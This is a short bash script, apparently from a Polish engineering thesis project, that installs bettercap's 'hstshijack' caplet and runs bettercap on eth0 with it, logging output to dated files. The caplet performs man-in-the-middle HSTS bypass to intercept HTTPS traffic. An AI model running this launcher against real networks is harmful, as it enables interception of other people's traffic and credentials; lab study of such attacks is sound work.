#!/bin/bash

#Regeneracja capletu hstshijack
sudo cp -r /home/ubuntu/inzynierka/bettercap/hstshijack /usr/local/share/bettercap/caplets

#uruchomienie programu bettercap
sudo /home/ubuntu/bettercap-2.32.0/bettercap -iface eth0 -caplet /usr/local/share/bettercap/caplets/hstshijack/hstshijack.cap | cat | tee /home/ubuntu/dane_inzynierka/bettercap-logs/bettercap_$(date +%d-%m-%Y_%I:%M%p).txt

